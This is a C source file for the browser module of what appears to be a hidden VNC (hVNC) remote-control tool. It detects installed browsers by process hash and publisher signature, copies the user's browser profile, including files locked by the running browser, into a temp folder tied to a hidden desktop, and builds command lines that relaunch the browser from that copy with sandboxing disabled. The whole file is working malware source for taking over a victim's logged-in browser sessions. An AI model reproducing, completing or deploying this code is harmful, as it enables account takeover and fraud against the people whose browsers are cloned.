//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: browser.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	common routines for browsers command line construction

#include "project.h"
#include <malloc.h>
#include "browser.h"
#include "copy.h"
#include "rt\file.h"
#include "rt\certinfo.h"
#include "rt\str.h"
#include <malloc.h>
#include "ff.h"
#include "chrome.h"
#include "opera.h"

BOOL g_bIsFF  = FALSE;
BOOL g_bIsOPR = FALSE;
BOOL g_bIsOPR_NEW = FALSE;
BOOL g_bIsCR = FALSE;
BOOL g_bIsIE  = FALSE;

#define LOCALAPPDATA_VAR    L"LOCALAPPDATA"
#define USERPROFILE_VAR     L"USERPROFILE"
#define LOCALAPPDATA_DIR_XP L"\\Local Settings\\Application Data"

typedef struct _BR_THREAD_CONTEXT
{
	HWND         hParentWnd;
	HANDLE       hThread;
	DWORD        ThreadID;
	BOOL         bExit;
	PVNC_SESSION pSession;
}BR_THREAD_CONTEXT,*PBR_THREAD_CONTEXT;

#define ID_TEXT   200

void _XCenterWindow(HWND hWnd)
{
	HWND hWndParent = GetParent(hWnd);
	RECT rcDlg;
	RECT rcCenter;
	int xLeft,yTop;

	GetWindowRect(hWnd,&rcDlg);
	GetWindowRect(hWndParent, &rcCenter);

	// find dialog's upper left based on rcCenter
	xLeft = (rcCenter.left + rcCenter.right) / 2 - (rcDlg.right - rcDlg.left) / 2;
	yTop  = (rcCenter.top + rcCenter.bottom) / 2 - (rcDlg.bottom - rcDlg.top) / 2;

	// map screen coordinates to child coordinates
	SetWindowPos( hWnd, NULL, xLeft, yTop, -1, -1,
		SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
}

static INT_PTR CALLBACK _XStatus_DialogProc(
	HWND hwndDlg,
	UINT uMsg,
	WPARAM wParam,
	LPARAM lParam
	)
{
	INT_PTR Result = FALSE;
	switch(uMsg)
	{
	case WM_INITDIALOG:
		_XCenterWindow(hwndDlg);
		Result = TRUE;
		break;
	case WM_CLOSE:
		EndDialog(hwndDlg,0);
		Result = TRUE;
		break;
	}
	return Result;
}

static LPWORD lpwAlign(LPWORD lpIn)
{
	ULONG ul;

	ul = (ULONG)(DWORD_PTR)lpIn;
	ul ++;
	ul >>=1;
	ul <<=1;
	return (LPWORD)(DWORD_PTR)ul;
}

static HWND _XStatus_DisplayMyMessage(HINSTANCE hinst, HWND hwndOwner, LPWSTR lpszMessage)
{
	HGLOBAL hgbl;
	LPDLGTEMPLATEW lpdt;
	LPDLGITEMTEMPLATEW lpdit;
	LPWORD lpw;
	LPWSTR lpwsz;
	HWND hWnd;
	int nchar;

	hgbl = GlobalAlloc(GMEM_ZEROINIT, 1024);
	if (!hgbl)
		return NULL;

	lpdt = (LPDLGTEMPLATE)GlobalLock(hgbl);

	// Define a dialog box.
	//lpdt->style = WS_POPUP | WS_BORDER | WS_SYSMENU | DS_MODALFRAME | WS_CAPTION;
	lpdt->style = WS_POPUP | WS_BORDER | DS_MODALFRAME;
	lpdt->cdit = 1;         // Number of controls
	lpdt->x  = 10;  lpdt->y  = 10;
	lpdt->cx = 100; lpdt->cy = 20;

	lpw = (LPWORD)(lpdt + 1);
	*lpw++ = 0;             // No menu
	*lpw++ = 0;             // Predefined dialog box class (by default)

	lpwsz = (LPWSTR)lpw;
	nchar = 1 + MultiByteToWideChar(CP_ACP, 0, "My Dialog", -1, lpwsz, 50);
	lpw += nchar;

	//-----------------------
	// Define a static text control.
	//-----------------------
	lpw = lpwAlign(lpw);    // Align DLGITEMTEMPLATE on DWORD boundary
	lpdit = (LPDLGITEMTEMPLATEW)lpw;
	lpdit->x  = 0; lpdit->y  = 5;
	lpdit->cx = 100; lpdit->cy = 20;
	lpdit->id = ID_TEXT;    // Text identifier
	lpdit->style = WS_CHILD | WS_VISIBLE | SS_CENTER;
	lpdit->dwExtendedStyle = WS_EX_TOPMOST;

	lpw = (LPWORD)(lpdit + 1);
	*lpw++ = 0xFFFF;
	*lpw++ = 0x0082;        // Static class

	for (lpwsz = (LPWSTR)lpw; *lpwsz++ = (WCHAR)*lpszMessage++;);
	lpw = (LPWORD)lpwsz;
	lpw = lpwAlign(lpw);    // Align creation data on DWORD boundary
	*lpw++ = 0;             // No creation data

	GlobalUnlock(hgbl); 
	hWnd = 
		CreateDialogIndirectW(
			hinst, 
			(LPDLGTEMPLATEW)hgbl, 
			hwndOwner, 
			(DLGPROC)_XStatus_DialogProc
			); 
	GlobalFree(hgbl); 
	ShowWindow(hWnd,SW_SHOW);
	return hWnd; 
}

VOID WINAPI _XStatus_Tread(PBR_THREAD_CONTEXT Context)
{
	PVNC_SESSION pSession = Context->pSession;
	HWND hWnd;

	SetThreadDesktop( pSession->Desktop.hDesktop );
	hWnd = 
		_XStatus_DisplayMyMessage(
			NULL,
			Context->hParentWnd,
			L"VNC is starting your browser..."
			);

	while ( !Context->bExit )
	{
		MSG msg;
		if (!GetMessage(&msg,NULL,0,0))
			break;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	DestroyWindow(hWnd);
}

PVOID XStatusStartThread(PVNC_SESSION pSession)
{
	PBR_THREAD_CONTEXT Context = hAlloc(sizeof(BR_THREAD_CONTEXT));
	if ( Context )
	{
		Context->pSession = pSession;
		Context->hParentWnd = pSession->SharedSection.Data->hShellWnd;
		Context->bExit = FALSE;
		
		Context->hThread =
			CreateThread(
				NULL,0,
				(LPTHREAD_START_ROUTINE)_XStatus_Tread,
				Context,
				0,
				&Context->ThreadID
				);
	}
	return Context;
}

VOID XStatusStopThread(PVOID Context)
{
	PBR_THREAD_CONTEXT BrContext = (PBR_THREAD_CONTEXT)Context;
	if ( BrContext )
	{
		BrContext->bExit = TRUE;
		if ( BrContext->ThreadID ){
			PostThreadMessage(BrContext->ThreadID,WM_QUIT,0,0);
		}
		if ( BrContext->hThread ){
			WaitForSingleObject( BrContext->hThread, INFINITE );
			CloseHandle( BrContext->hThread );
		}
		hFree ( BrContext );
	}
}

//////////////////////////////////////////////////////////////////////////
// init some browser globals
// currently we just detect browser type

typedef BOOL (*FUNC_InitBrowser)(PVNC_SESSION pSession);

typedef struct _BROWSER_DEF
{
	//LPWSTR szProcessName;
	//int    szProcessNameLen;
	DWORD  ProcessNameHash;
	LPWSTR szPublicherName;
	WORD   MinMajor; // min major
	WORD   MaxMajor;
	LPBOOL Variable;
	FUNC_InitBrowser InitFunc;
}BROWSER_DEF,*PBROWSER_DEF;

BROWSER_DEF Browsers[] =
{
	{
		HOST_IEXPLORE, 
		wczIexplorePublisher, 
		0,0,
		&g_bIsIE,
		NULL
	},
	{
		HOST_FIREFOX,
		wczFirefoxPublisher, 
		0,0,
		&g_bIsFF,
		FF_CreateEvent
	},	
	{
		HOST_CHROME, 
		wczChromePublisher, 
		0,0,
		&g_bIsCR,
		CR_CreateEvent
	},
	{
		HOST_LAUNCHER,
		wczOperaPublisher, 
		16,0,
		&g_bIsOPR_NEW,
		OPRN_CreateEvent
	},
	{
		HOST_OPERA,
		wczOperaPublisher, 
		16,0,
		&g_bIsOPR_NEW,
		OPRN_CreateEvent
	},
	{
		HOST_OPERA,
		wczOperaPublisher, 
		0,15,
		&g_bIsOPR ,
		OPR_CreateEvent
	},
	{
		0, NULL
	}
};

BOOL BR_IsIE( VOID ) { return g_bIsIE; }
BOOL BR_IsFF( VOID ) { return g_bIsFF; }
BOOL BR_IsCR( VOID ) { return g_bIsCR; }
BOOL BR_IsOPR( VOID ) { return g_bIsOPR; }
BOOL BR_IsOPR_NEW( VOID ) { return g_bIsOPR_NEW; }
BOOL BR_IsBrowser( VOID ) { return g_bIsIE || g_bIsFF || g_bIsCR || g_bIsOPR || g_bIsOPR_NEW; }

VOID BR_DetectAndInit(PVNC_SESSION pSession, LPWSTR szProcessPath, DWORD ProcessNameHash)
{
	WINERROR Error;
	PBROWSER_DEF Browser = NULL;
	BOOL bHavePublisherInfo = FALSE;
	BOOL bHaveVersion = FALSE;
	BOOL bFound = FALSE;

	CERT_PUBLISHERINFO PublisherInfo = { 0 };	
	WORD Major = 0;

	if ( ProcessNameHash )
	{
		for ( Browser = Browsers; Browser->ProcessNameHash; Browser++ )
		{
			if ( ProcessNameHash == Browser->ProcessNameHash )
			{
				if ( Browser->szPublicherName ){
					if ( bHavePublisherInfo == FALSE ){
						Error = CryptExeSignerInfoW(szProcessPath,&PublisherInfo);
						if ( Error != CRYPT_E_NO_MATCH ){
							if ( Error != NO_ERROR ){
								break;
							}
							bHavePublisherInfo = TRUE;
						}
					}

					if ( bHavePublisherInfo && (PublisherInfo.lpszSubjectName == NULL ||
						lstrcmpiW(PublisherInfo.lpszSubjectName,Browser->szPublicherName)))
					{
						continue;
					}
				}
				if ( Browser->MinMajor || Browser->MaxMajor ){
					if ( bHaveVersion == FALSE ){
						Error = FileGetVersionW(szProcessPath,&Major,NULL,NULL,NULL);
						if ( Error != NO_ERROR ){
							continue;
						}
						bHaveVersion = TRUE;
					}
					if ( Browser->MinMajor && Browser->MinMajor > Major ){
						continue;
					}
					if ( Browser->MaxMajor && Browser->MaxMajor < Major ){
						continue;
					}
				}
				*Browser->Variable = TRUE;
				if ( Browser->InitFunc ){
					Browser->InitFunc(pSession);
				}
				break;
			}
		}
		if ( bHavePublisherInfo )
		{
			if ( PublisherInfo.lpszSubjectName ){
				hFree ( PublisherInfo.lpszSubjectName );
			}
			if ( PublisherInfo.lpszProgramName ){
				hFree ( PublisherInfo.lpszProgramName );
			}
			if ( PublisherInfo.lpszPublisherLink ){
				hFree ( PublisherInfo.lpszPublisherLink );
			}
			if ( PublisherInfo.lpszMoreInfoLink ){
				hFree ( PublisherInfo.lpszMoreInfoLink );
			}
		}
	}
}

// this function build temp path into the following format
// %TEMP%\{DESKTOP_GUID}_BROWSER_PREFIX
LPWSTR BR_GetTempProfileName(IN PVNC_SESSION pSession, IN LPWSTR Suffix)
{
	WINERROR Error = NO_ERROR;
	LPWSTR szTempPath = NULL;
	DWORD  szTempPathLength,Result;
	USES_CONVERSION;

	do{
		// construct dst profile path
		szTempPathLength = GetTempPathW(0,NULL);
		if ( szTempPathLength == 0 ){
			Error = GetLastError();
			DbgPrint("GetTempPathW failed, Error=%x\n",Error);
			break;
		}
		szTempPath = hAlloc((szTempPathLength+MAX_PATH+2)*sizeof(WCHAR)); // \\+_+/0
		if ( szTempPath == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}

		// save profile dir path
		Result = GetTempPathW(szTempPathLength+1,szTempPath);
		if ( Result == 0 || Result > szTempPathLength ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("GetTempPathW failed, Error=%x\n",Error);
			break;
		}
		Result = GetLongPathNameW(szTempPath,szTempPath,szTempPathLength+MAX_PATH+1);
		if ( Result == 0 || Result > szTempPathLength+MAX_PATH+1 ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("GetTempPathW failed, Error=%x\n",Error);
			break;
		}
		lstrcatW(szTempPath,L"\\");
		lstrcatW(szTempPath,T2W(pSession->Desktop.Name));
		if ( Suffix ){
			lstrcatW(szTempPath,L"_");
			lstrcatW(szTempPath,Suffix);
		}
	}while ( FALSE );

	if ( Error != NO_ERROR ){
		hFree ( szTempPath );
		szTempPath = NULL;
	}

	return szTempPath;
}

// this function returns the pointer to env variable value
// it also fixes the situation when LOCALAPPDATA is not present on XP
LPWSTR _GetEnvironmentVariableW(LPWSTR lpName)
{
	DWORD Error = NO_ERROR;
	DWORD Result;
	LPWSTR Variable = NULL;
	DWORD VariableLength;

	// get buffer length
	VariableLength = GetEnvironmentVariableW(lpName,NULL,0);
	if ( VariableLength )
	{
		Variable = hAlloc(VariableLength*sizeof(WCHAR));
		if ( Variable != NULL )
		{
			Result = GetEnvironmentVariableW(lpName,Variable,VariableLength);
			if ( Result == 0 || Result > VariableLength ){
				Error = GetLastError();
				hFree ( Variable );
				Variable = NULL;
				SetLastError(Error);
			}
		}
		else
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		}
	}
	else
	{
		if ( IsXP() )
		{
			if ( GetLastError() == ERROR_ENVVAR_NOT_FOUND &&
				lstrcmpW(lpName,LOCALAPPDATA_VAR)== 0 )
			{
				VariableLength = GetEnvironmentVariableW(USERPROFILE_VAR,NULL,0);
				if ( VariableLength )
				{
					Variable = hAlloc(VariableLength*sizeof(WCHAR)+sizeof(LOCALAPPDATA_DIR_XP));
					if ( Variable != NULL )
					{
						Result = GetEnvironmentVariableW(USERPROFILE_VAR,Variable,VariableLength);
						if ( Result == 0 || Result > VariableLength ){
							Error = GetLastError();
							hFree ( Variable );
							Variable = NULL;
							SetLastError(Error);
						}else{
							lstrcatW(Variable,LOCALAPPDATA_DIR_XP);
						}
					}
					else
					{
						SetLastError(ERROR_NOT_ENOUGH_MEMORY);
					}
				}
			}
		}
	}
	return Variable;
}

//////////////////////////////////////////////////////////////////////////
// returns cmdline arguments for new browser instance
// it works for ff, chrome and opera blink
// in all cases we need to copy user profile to some temp location 
//    // %TEMP%\{DESKTOP_GUID}_BROWSER_PREFIX 
// (it lives during vnc session)
// and create additional browser command line
// chrome and opera blink store all profiles in one directory

// chrome:
// XP
// C:\Documents and Settings\Administrator\Local Settings\Application Data\Google\Chrome\User Data
// e.g. %USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data
// or %LOCALAPPDATA%\Google\Chrome\User Data (LOCALAPPDATA var can be absent on XP)
// Vista
// C:\Users\tor\AppData\Local\Google\Chrome\User Data
// e.g. %LOCALAPPDATA%\Google\Chrome\User Data
//
// opera blink
// XP
// C:\Documents and Settings\Administrator\Application Data\Opera Software\Opera Stable
// e.g. %APPDATA%\Opera Software\Opera Stable
// Vista
// C:\Users\tor\AppData\Roaming\Opera Software\Opera Stable
// e.g. %APPDATA%\Opera Software\Opera Stable
// 
// firefox puts profiles at
// %APPDATA%\Mozilla\Firefox
// 

//
// this function expands browser profile path
// %LOCALAPPDATA%\Google\Chrome\User Data -> C:\Users\tor\AppData\Local\Google\Chrome\User Data
//
LPWSTR 
	BR_GetProfileNameW(
		IN PVNC_SESSION pSession, 
		IN LPWSTR ProfileVarName, // env variable for profile
		IN LPWSTR BrowserProfileDir //browser profile directory: "Google\\Chrome\\User Data"
		)
{
	DWORD Error = NO_ERROR;
	LPWSTR szProfileVar = NULL;
	LPWSTR szBrowserProfile = NULL;
	int szBrowserProfileLength;

	do{
		szProfileVar = _GetEnvironmentVariableW(ProfileVarName);
		if ( szProfileVar == NULL ){
			Error = GetLastError();
			DbgPrint("_GetEnvironmentVariableW failed, Error=%x\n",Error);
			break;
		}

		szBrowserProfileLength = lstrlenW(szProfileVar) + lstrlenW(BrowserProfileDir) + 2; // \\ + /0
		szBrowserProfile = hAlloc(szBrowserProfileLength*sizeof(WCHAR));
		if ( szBrowserProfile == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}

		//C:\Users\USER\AppData\Roaming->C:\Users\USER\AppData\Roaming\ 
		lstrcpyW(szBrowserProfile,szProfileVar);
		if ( BrowserProfileDir ){
			lstrcatW(szBrowserProfile,L"\\");
			lstrcatW(szBrowserProfile,BrowserProfileDir);
		}

		Error = NO_ERROR;

	} while ( FALSE );

	if ( szProfileVar ){
		hFree( szProfileVar );
	}
	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}
	return szBrowserProfile;
}

//
// copies src profile dir to another
// it shows status message while copying files
// and can copy opened files by ProcessName application
//
DWORD 
	BR_CopyProfile(
		IN PVNC_SESSION pSession,
		IN LPWSTR BrowserPrefix, // FF or CR
		IN LPWSTR SrcPath,
		IN LPWSTR DstPath,
		IN LPWSTR ProcessName // optional
		)
{
	DWORD Error = NO_ERROR;
	BOOL fbNeedToCopy;
	PVOID StatusCtx = NULL;
	HANDLE hCS =NULL;
	USES_CONVERSION;

	do 
	{
		// enter to critical section for browsers
		hCS = BR_EnterCriticalSection(pSession);
		if ( hCS == NULL ){
			// failed to start browser
			Error = ERROR_TIMEOUT;
			DbgPrint("BR_EnterCriticalSection failed, Error=%x\n",Error);
			break;
		}

		// first check if we need to copy profile
		// create named event to identify the running FF copy
		fbNeedToCopy = !BR_IsStarted(pSession,W2T(BrowserPrefix));

		if ( fbNeedToCopy ){
			// show status window
			StatusCtx = XStatusStartThread(pSession);

			// copy browser data
			Error = 
				XCopyDirectorySpecifyProcessW(
					ProcessName,
					SrcPath,
					DstPath
					);

			// remove status window
			XStatusStopThread(StatusCtx);

			// leave critical section
			BR_LeaveCriticalSection(pSession,hCS );

			if ( Error != NO_ERROR ){
				DbgPrint("XCopyDirectorySpecifyProcessW failed, Error=%x\n",Error);
				break;
			}
		} else{
			// just leave critical section
			BR_LeaveCriticalSection(pSession,hCS );
		}
	}while (FALSE);
	return Error;
}

//////////////////////////////////////////////////////////////////////////
// function copies browser profile to
// new hvnc location and builds new commandline
// to start browser using this new profile location
WINERROR 
	BR_PrepareProfileAndGetCmdlineW(
		 IN PVNC_SESSION pSession, 
		 IN LPWSTR szProcessName,
		 IN LPWSTR ProfileVar, // env variable for profile
		 IN LPWSTR BrowserProfileDir, //browser profile directory: "Google\\Chrome\\User Data"
		 IN LPWSTR BrowserPrefix, // browser prefix like CR or OPR
		 IN LPWSTR ArgHead, // --user-data-dir=
		 IN LPWSTR ArgTail, // --no-sandbox --allow-no-sandbox-job....
		 OUT LPWSTR *pNewCommandLine
		 )
{
	WINERROR Error = NO_ERROR;

	LPWSTR szHvncProfile = NULL;
	LPWSTR szSrcProfile = NULL;

	LPWSTR NewCommandLine = NULL;
	int NewCommandLineLength;

	USES_CONVERSION;

	do{
		// build vnc profile for our browser
		// (located into the temp directory)
		// %TEMP%\{DESKTOP_GUID}_BROWSER_PREFIX
		szHvncProfile = BR_GetTempProfileName(pSession,BrowserPrefix);
		if ( szHvncProfile == NULL ){
			Error = GetLastError();
			DbgPrint("BR_GetTempProfileName failed, Error=%x\n",Error);
			break;
		}

		// now we should construct source profile path by expanding 
		// %APPDATA%\Google\Chrome\User Data to
		// C:\Users\USER\AppData\Local\Google\Chrome\User Data
		szSrcProfile = 
			BR_GetProfileNameW(
				pSession,
				ProfileVar,
				BrowserProfileDir
				);
		if ( szHvncProfile == NULL ){
			Error = GetLastError();
			DbgPrint("BR_GetProfileNameW failed, Error=%x\n",Error);
			break;
		}

		// then copy source profile to hvnc profile
		// attn! it's complex function
		// it copies 1 directory to another,
		// including files locked by szProcessName process
		// and shows status dialog box
		Error = 
			BR_CopyProfile(
				pSession,
				BrowserPrefix,
				szSrcProfile,
				szHvncProfile,
				szProcessName
				);

		if ( Error != NO_ERROR ){
			if ( Error != ERROR_PATH_NOT_FOUND ){
				DbgPrint("BR_CopyProfile failed, Error=%x\n",Error);
				break;
			}
			Error = NO_ERROR;
		}

		// here we are
		// now we need to construct browser command-line
		// 
		// --user-data-dir="%HVNCPROFILE%" --no-sandbox .....
		NewCommandLineLength = 
			(ArgHead ? (lstrlenW(ArgHead) + 1 ) : 0) + 
			lstrlenW(szHvncProfile) + 1 +
			(ArgTail ? (lstrlenW(ArgTail) + 1 ) : 0) +
			1;
		NewCommandLine = hAlloc(NewCommandLineLength*sizeof(WCHAR));
		if ( NewCommandLine == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}
		if ( ArgHead ){
			lstrcpyW(NewCommandLine,ArgHead);
		}else{
			NewCommandLine[0] = 0;
		}
		lstrcatW(NewCommandLine,L"\"");
		lstrcatW(NewCommandLine,szHvncProfile);
		lstrcatW(NewCommandLine,L"\"");
		if ( ArgTail ){
			lstrcatW(NewCommandLine,ArgTail);
		}
		Error = NO_ERROR;

	} while ( FALSE );

	if ( Error != NO_ERROR ){
		if ( NewCommandLine ){
			hFree( NewCommandLine );
		}
	}else{
		*pNewCommandLine = NewCommandLine;
	}

	if ( szSrcProfile ){
		hFree( szSrcProfile );
	}
	if ( szHvncProfile ){
		hFree( szHvncProfile );
	}
	return Error;
}

WINERROR 
	BR_GetCommandLineA(
		PVNC_SESSION pSession, 
		LPCSTR szPath,
		LPSTR *pNewCommandLine,
		FUNC_GetCommandLineW GetCommandLineWPtr
		)
{
	LPWSTR NewCommandLineW = NULL;
	LPSTR NewCommandLineA = NULL;
	WINERROR Error;
	USES_CONVERSION;

	// validate path
	PathRemoveBlanksA((LPSTR)szPath);
	PathRemoveArgsA((LPSTR)szPath);

	Error = GetCommandLineWPtr(pSession,A2W(szPath),&NewCommandLineW);
	if ( Error == NO_ERROR )
	{
		if ( NewCommandLineW ){
			NewCommandLineA = AllocateAndCopyWideStringToString(NewCommandLineW);
			if ( NewCommandLineA ){
				*pNewCommandLine = NewCommandLineA;
			}else{
				Error = ERROR_NOT_ENOUGH_MEMORY;
			}
			hFree ( NewCommandLineW );
		}else{
			*pNewCommandLine = NULL;
		}
	}
	return Error;
}